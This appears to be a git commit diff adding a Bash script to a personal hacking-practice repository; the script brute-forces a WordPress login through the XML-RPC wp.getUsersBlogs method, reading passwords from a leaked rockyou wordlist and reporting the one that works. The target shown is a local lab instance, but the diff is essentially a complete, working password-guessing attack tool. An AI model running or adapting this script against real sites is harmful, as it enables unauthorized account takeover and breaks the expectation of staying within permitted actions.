94d0230b7082b48e2ccbbc9ef2b6d6a39ec22b89
Z0SO <lautarorobales31@gmail.com>
2025-01-03 18:25:04 -0300

    script wpbf

--- 4-enumeracion/xmlrpc-brute_force.sh
+++ 4-enumeracion/xmlrpc-brute_force.sh
@@ -17,8 +17,44 @@ ctrl_c() {
     exit 1
 }
 
+# Función para crear el archivo XML
+createxml() 
+{
+    password=$1
+
+    this_xml="""
+    <?xml version=\"1.0\" encoding=\"UTF-8\"?>
+    <methodCall> 
+    <methodName>wp.getUsersBlogs</methodName> 
+    <params> 
+    <param><value>zoso</value></param> 
+    <param><value>$password</value></param> 
+    </params> 
+    </methodCall>
+    """
+
+    echo $this_xml > file.xml
+    response=$(curl -s -X POST http://localhost:31337/xmlrpc.php -d@file.xml)
+    
+    if [ ! "$(echo $response | grep "Incorrect username or password")" ]; then
+        echo -e "${green}[+] Contraseña encontrada: ${password}${end}"
+        exit 1
+    fi
+
+}
 
 main()
 {
+    cat ~/Documents/repos/hacking/SecLists/Passwords/Leaked-Databases/rockyou-45.txt  | while read password; do
+        
+        echo -e "${yellow}[*] Probando con la contraseña: ${password}${end}"
+        createxml $password
+
+    done
 
 }
+
+
+main
+
+tput cnorm
